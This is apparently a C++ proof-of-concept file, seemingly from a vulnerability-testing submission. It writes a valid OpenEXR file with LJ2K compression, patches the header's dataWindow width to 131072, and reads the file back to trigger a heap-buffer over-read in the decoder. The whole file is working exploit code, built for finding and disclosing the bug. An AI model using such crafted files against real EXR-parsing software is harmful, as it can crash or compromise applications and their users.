//
// PoC: LJ2K decoder over-read on a crafted OpenEXR file.
//
// A valid LJ2K (lossy HTJ2K) RGBA file is written with the library.  Every
// lossy chunk is coded as an independent JPEG 2000 codestream whose SIZ
// marker carries the (boundary-padded) chunk dimensions.  The decoder is
// supposed to accept a codestream only when its extent equals the chunk size
// padded to the next low-pass fold position; it then copies chunk.width
// samples out of each decoded line.
//
// We take that valid file and change nothing but the data-window width in the
// header, enlarging it well beyond the width coded in the embedded
// codestream.  On read, the reader allocates channels for the (large) header
// width while the codestream still decodes the original (small) width, so the
// per-line copy reads chunk.width samples from a line buffer that only holds
// the small coded width -> heap-buffer-overflow read inside the HT decoder.
//
// Build (against the ASan OpenEXR build in build-asan):
//   see cmd in submission.json
//
#include <ImfRgbaFile.h>
#include <ImfHeader.h>
#include <ImfArray.h>
#include <ImfCompression.h>
#include <Imath/ImathBox.h>

#include <cmath>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <fstream>
#include <string>
#include <vector>

using namespace OPENEXR_IMF_NAMESPACE;
using namespace IMATH_NAMESPACE;

static const int  SMALL_W = 64;   // width actually coded in the codestream
static const int  SMALL_H = 64;
static const int  BIG_W   = 131072;

static std::vector<uint8_t>
readFile (const std::string& fn)
{
    std::ifstream f (fn, std::ios::binary);
    return std::vector<uint8_t> (
        std::istreambuf_iterator<char> (f), std::istreambuf_iterator<char> ());
}

static void
writeFile (const std::string& fn, const std::vector<uint8_t>& b)
{
    std::ofstream f (fn, std::ios::binary);
    f.write (reinterpret_cast<const char*> (b.data ()), (std::streamsize) b.size ());
}

int
main (int argc, char** argv)
{
    std::string dir = (argc > 1) ? argv[1] : "/tmp";
    std::string src = dir + "/lj2k_poc_src.exr";
    std::string bad = dir + "/lj2k_poc_bad.exr";

    // 1. Write a genuine, valid LJ2K file.
    {
        Array2D<Rgba> px (SMALL_H, SMALL_W);
        for (int y = 0; y < SMALL_H; ++y)
            for (int x = 0; x < SMALL_W; ++x)
            {
                float v = (float) ((60.0 + 0.25 * y + 30.0 * std::sin (x / 7.0)) / 255.0);
                px[y][x] = Rgba (v, v, v, 1.f);
            }

        Header hdr (SMALL_W, SMALL_H);
        hdr.compression ()       = LJ2K_COMPRESSION;
        hdr.lossyHTJ2KQuality () = 60.f;
        RgbaOutputFile out (src.c_str (), hdr, WRITE_RGBA);
        out.setFrameBuffer (&px[0][0], 1, SMALL_W);
        out.writePixels (SMALL_H);
    }

    // 2. Patch the data-window width: find "dataWindow\0box2i\0", skip the
    //    4-byte size field, and overwrite xmax (the 3rd int32) with BIG_W-1.
    std::vector<uint8_t> bytes = readFile (src);
    const char           key[] = "dataWindow\0box2i";
    const size_t         keyLen = sizeof (key) - 1; // includes the embedded NUL

    size_t pos = std::string::npos;
    for (size_t i = 0; i + keyLen <= bytes.size (); ++i)
        if (std::memcmp (bytes.data () + i, key, keyLen) == 0)
        {
            pos = i;
            break;
        }
    if (pos == std::string::npos)
    {
        std::fprintf (stderr, "could not locate dataWindow attribute\n");
        return 2;
    }

    // layout: "dataWindow\0" "box2i\0" <int32 size=16> <int32 xmin ymin xmax ymax>
    size_t valueOff = pos + keyLen + 1 /*NUL after box2i*/ + 4 /*size*/;
    size_t xmaxOff  = valueOff + 8; // xmin(4) + ymin(4)

    int32_t newXmax = BIG_W - 1;
    std::memcpy (bytes.data () + xmaxOff, &newXmax, sizeof (newXmax));

    writeFile (bad, bytes);

    // 3. Read the crafted file through the public RGBA reader.  Allocate the
    //    framebuffer for the (large) advertised width so that any fault is in
    //    the library, not in this harness.
    try
    {
        RgbaInputFile in (bad.c_str ());
        Box2i         dw = in.dataWindow ();
        int           w  = dw.max.x - dw.min.x + 1;
        int           h  = dw.max.y - dw.min.y + 1;
        std::fprintf (stderr, "advertised data window: %d x %d\n", w, h);

        Array2D<Rgba> rd (h, w);
        in.setFrameBuffer (
            &rd[0][0] - dw.min.x - dw.min.y * (ptrdiff_t) w, 1, w);
        in.readPixels (dw.min.y, dw.max.y);

        std::fprintf (stderr, "read completed without fault\n");
    }
    catch (const std::exception& e)
    {
        // A correctly-hardened decoder rejects the crafted chunk and throws;
        // that is the SECURE outcome (no sanitizer fault).
        std::fprintf (stderr, "rejected cleanly: %s\n", e.what ());
    }
    return 0;
}
